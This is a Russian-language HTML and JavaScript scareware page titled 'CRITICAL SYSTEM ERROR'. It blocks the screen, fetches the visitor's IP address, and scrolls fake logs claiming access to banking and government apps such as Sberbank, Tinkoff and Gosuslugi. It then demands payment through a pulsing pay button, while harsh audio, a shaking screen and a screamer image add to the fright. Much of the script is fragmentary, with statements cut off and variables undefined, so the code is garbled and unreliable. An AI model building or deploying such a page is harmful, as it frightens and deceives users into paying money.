<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL SYSTEM ERROR</title>
    <style>
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; overflow: hidden; cursor: pointer; font-family: 'Courier New', monospace; touch-action: none; }
        
        #vid { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; display: block; pointer-events: none; z-index: 1; transition: transform 0.05s, filter 0.1s; opacity: 0; }
        .show-vid { opacity: 1 !important; }
        
        .shake { animation: shakeAnim 0.05s infinite; }
        @keyframes shakeAnim {
            0% { transform: translate(20px, 10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(90deg) invert(1); }
            25% { transform: translate(-20px, -10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(180deg) invert(0); }
            50% { transform: translate(20px, -10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(270deg) invert(1); }
            75% { transform: translate(-20px, 10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(360deg) invert(0); }
            100% { transform: translate(10px, -20px) scale(1.3) rotate(0deg); filter: contrast(4) hue-rotate(0deg); }
        }
        
        #glitch-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 5; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px); animation: glitch 0.1s infinite; }
        @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
        
        #virus-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(100, 0, 0, 0.95); color: #fff; z-index: 9999; text-align: left; padding: 15px; font-weight: bold; font-size: 16px; overflow: hidden; }
        #virus-overlay h1 { font-size: 28px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center; text-shadow: 2px 2px 0 #000; }
        
        #terminal-text { margin-top: 10px; height: 60vh; overflow-y: hidden; color: #00ff00; font-size: 13px; text-shadow: 0 0 5px #00ff00; line-height: 1.2; }
        .threat-text { color: #ff3333; font-size: 16px; margin-top: 10px; text-align: center; background: #000; padding: 10px; border: 1px solid red; }
        
        #pay-btn { display: none; margin: 10px auto; padding: 12px 25px; background: yellow; color: black; font-size: 18px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate; z-index: 10000; position: relative; width: 90%; max-width: 300px; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.05); } }
        
        #hint { position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px; text-align: center; color: #fff; font-size: 18px; opacity: 0.7; transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif; }
        #hint.hidden { opacity: 0; }

        #screamer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 999999; background: #000; justify-content: center; align-items: center; animation: shakeAnim 0.05s infinite; }
        #screamer img { width: 100%; height: 100%; object-fit: cover; filter: contrast(2) saturate(0) invert(0.1); }

        #blocker {
            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 9999999; background: transparent;
        }

        .arabic-float {
            position: fixed; color: red; font-size: 24px; font-weight: bold; z-index: 100000; pointer-events: none;
            animation: floatUp 2s forwards; text-shadow: 2px 2px 4px #000;
        }
        @keyframes floatUp {
            0% { transform: translateY(0) scale(1); opacity: 1; }
            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
        }
    </style>
</head>
<body>

                try {
                    if ('wakeLock' in navigator) {

            }

            function start() {
                if (started) return;
                started = true;

                keepScreenAwake();

                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {

                blocker.style.display = 'block';

                let isRickroll = Math.random() < 0.1;

                    const arabicChars = ["ض", "ص", "ث", "ق", "ف", "غ", "ع", "ه", "خ", "ح"];

                    }, 500);

                    const threats = [

                    ];
                    let threatIndex = 0;
                    setInterval(() => {

                    const fakeApps = ["VK", "Telegram", "Sberbank", "Tinkoff", "Gosuslugi", "МЭШ", "YouTube", "Chrome", "Галерея"];

                    fakeApps.sort(() => Math.random() - 0.5).forEach(app => { logs.push(`> Найдено приложение: [${app}] - доступ получен`); });

                    let logInterval = setInterval(() => {
                        if(logIndex < logs.length) {
                            terminalText.innerHTML += logs[logIndex] + "<br>";
                            terminalText.scrollTop = terminalText.scrollHeight;
                            logIndex++;

                            if(terminalText.innerHTML.length > 5000) {
                                terminalText.innerHTML = "> ОШИБКА ДОСТУПА. ТРЕБУЕТСЯ ОПЛАТА.<br>";
                            }
                        }
                    }, 250); 

                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        if (AudioContext) {
                            const audioCtx = new AudioContext();
                            if (audioCtx.state === 'suspended') audioCtx.resume();

                            const oscillator = audioCtx.createOscillator();
                            oscillator.type = 'sawtooth';
                            oscillator.frequency.setValueAtTime(400, audioCtx.currentTime);
                            const compressor = audioCtx.createDynamicsCompressor();
                            compressor.threshold.value = -40;
                            const oscGain = audioCtx.createGain();
                            oscGain.gain.value = 0.8;
                            oscillator.connect(oscGain);
                            oscGain.connect(compressor);
                            compressor.connect(audioCtx.destination);
                            oscillator.start();

                            setInterval(() => {
                                if (audioCtx.state === 'running') {
                                    oscillator.frequency.linearRampToValueAtTime(1200, audioCtx.currentTime + 0.5);

                                screamGain.gain.value = 1.0;
                                screamOsc.connect(screamGain);
                                screamGain.connect(audioCtx.destination);
                                screamOsc.start();
                                setTimeout(() => { screamer.style.display = 'none'; try { screamOsc.stop(); } catch(e){} }, 5000);

                };

                payBtn.addEventListener('click', function() {
